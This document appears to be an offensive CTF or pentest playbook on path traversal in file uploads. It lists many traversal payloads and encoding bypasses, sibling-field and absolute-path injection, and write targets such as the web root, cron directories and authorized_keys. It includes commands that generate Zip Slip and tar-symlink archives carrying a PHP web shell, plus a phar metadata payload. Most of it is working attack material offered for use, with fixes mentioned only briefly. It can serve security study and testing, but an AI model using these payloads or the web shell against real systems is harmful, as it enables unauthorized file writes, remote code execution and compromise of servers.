# Path Traversal — landing the file outside the upload dir

## The sink shapes — where traversal actually lives

```
filename="../../../x.php"          # multipart filename field
filename="/var/www/x.php"          # absolute path
path/dir/folder/destination fields  # sibling form fields
filename="..\\..\\x.aspx"          # Windows separators
zip/tar entry names                 # archive extraction — archive-attacks.md
symlink inside archive              # write-through-link — archive-attacks.md
upload-then-move: rename/copy API  # a second endpoint moves the file
Content-Disposition filename*=      # RFC 5987 encoding — parser-differentials.md
```

## Multipart filename traversal — the primitives

```
../../../shell.php
....//....//shell.php        # survives naive ../ strip
..\/..\/shell.php            # mixed separators
..%2f..%2fshell.php          # if server URL-decodes the name
..%252f..%252fshell.php      # double-decode pipelines
../../x.php%00.jpg           # legacy null-truncate
..;/..;/x.jsp                # IIS/Tomcat separator quirks
....\\....\\x.aspx           # Windows backslash traversal
```

`../` count: 8 is enough to reach `/` from anywhere reasonable — overshoot
freely, `..` past root is a no-op on POSIX.

## Where the joined path is built — the real vulnerability shape

```python
save_path = os.path.join(UPLOAD_DIR, filename)     # naive → /x../../
save_path = UPLOAD_DIR + "/" + filename             # same
open(os.path.join(dir, name), "w")                  # same
shutil.move(tmp, user_dir + name)                   # same
```

`os.path.join` does NOT sanitize — `join("/up", "../../x")` escapes.
`basename()`/`secure_filename`/`Path(name).name` are the fixes — their
**absence** is the bug. White-box: grep `join.*filename|\+ *filename|File\(.*filename`.

## Absolute-path injection — sometimes simpler than `../`

```
filename="/var/www/html/shell.php"
filename="/proc/self/fd/0"             # exotic write targets
filename="/app/templates/x.html"       # template overwrite → SSTI
filename="/app/config/settings.py"     # config overwrite
filename="C:\\inetpub\\wwwroot\\x.aspx"
```

A `join`-style sink is bypassed outright by an absolute path on POSIX
(`os.path.join("/up", "/etc/x")` → `/etc/x`) — Python, Go `path.Join`? Go
keeps both elements joined — test per stack. Java `new File(dir, "/abs")`
→ resolves to `/abs` on POSIX.

## Sibling form fields — the path is not only `filename=`

The same multipart body can carry:

- `path`, `dir`, `folder`, `destination`, `target`, `subdir`, `category`
- `album`, `collection`, `project` (mapped into a filesystem path)
- `saveas`, `rename_to`, `newname` (post-save rename endpoints)
- URL query params: `POST /upload?dir=../../`
- JSON body fields in JSON-upload APIs: `{"filename":"../../x.php","data":"..."}`

Test each for traversal independent of `filename` — validators frequently
harden the file field and forget the directory field.

## Write targets that matter — what to land on

| Target | Payoff |
|---|---|
| web root + exec ext | direct shell — `/var/www/html/x.php` |
| template dir | template overwrite → SSTI/RCE (apexsurvive chain) |
| `.htaccess`/`.user.ini`/web.config | change handler map → `server-configs.md` |
| app source/config | overwrite logic or secrets — `file-overwrite.md` |
| `~/.ssh/authorized_keys` | shell access — rare in CTF web |
| cron/spool dirs | scheduled exec — `/etc/cron.d/`, `/var/spool/cron/` |
| startup dirs | `~/.bashrc`, supervisord conf.d, systemd units |
| log/session dirs | poison what another feature reads |

## The confirm — how to prove the write landed outside

- a probe file written via traversal must be *read back*: a second
  traversal via a file-read endpoint, or the file's own route
- status differences: write to `../../exists/x` vs `../../nonexistent-dir/x`
  — some apps error differently (missing dir = 500, exists = 200)
- write a marker into a known-public dir (`../../static/m.txt`) and fetch it
- white-box: trace `save_path` construction to the sink — grep the join

## Zip Slip — archive traversal (the big one)

When the app extracts an uploaded archive, entry names are attacker paths:

```bash
python3 tools/web/archive_gen.py zipslip --out evil.zip --depth 8 \
  --name shell.php --content '<?php system($_GET["c"]); ?>'
python3 tools/web/archive_gen.py zipslip --out evil.zip --absolute \
  --name x.php --content '...'          # absolute-path entries too
python3 tools/web/archive_gen.py tarslip --out evil.tar --depth 8 \
  --link-target /var/www/html --link-name link   # symlink member
```

Entry forms to emit (tool covers the first two):

```
../../shell.php          # relative escape
..%2f..%2fshell.php      # encoded (some extractors decode)
/shell.php               # absolute (absolute entries: --absolute)
..\\..\\x.php            # Windows separators inside entries
```

The symlink two-step (tarslip `--link-target`/`--link-name`): write a
symlink member `link -> /var/www/html`, then a second member
`link/shell.php` — extractors that follow the link write into the target.

Also `phar` subcommand for PHP apps that `phar://`-include uploaded archives:
`archive_gen.py phar --metadata 'O:1:"X":0:{}' --out x.phar`.

## Double-step paths — upload lands in tmp, app moves it

`store tmp → validate → move to user_dir` flows: the traversal may need to
be relative to a DIFFERENT root (the temp dir or the move destination).
White-box: trace both the save and the move path.

## Encoding layers around the traversal

- URL-encoded in the multipart filename — some parsers decode
- `filename*=UTF-8''..%2f..%2fx.php` — RFC 5987 extended form, decoded
  by compliant parsers, passed literally by naive ones
- UTF-8 overlong / `..%c0%af` — decoded by some stacks
- Unicode normalization: `．．／` fullwidth chars normalized to `../` by
  some frameworks (Node NFC quirks, Java normalize)
- `..;/` — Tomcat treats `;` params after path segments

## Falsifiers

- `basename()`/`Path().name`/`secure_filename` is applied everywhere the
  name is used (verify in source; probe all of filename+path+rename)
- absolute paths are rejected or rooted (`realpath` check contains prefix)
- archive extraction uses a sanitize-aware extractor (every entry checked)
- the filesystem the writes hit is mounted read-only for the app user

## Output to record

- the field and encoding that carried the traversal
- the landed path proven by a fetch-back or a second read
- whether writes can reach an executed directory, config, or template dir
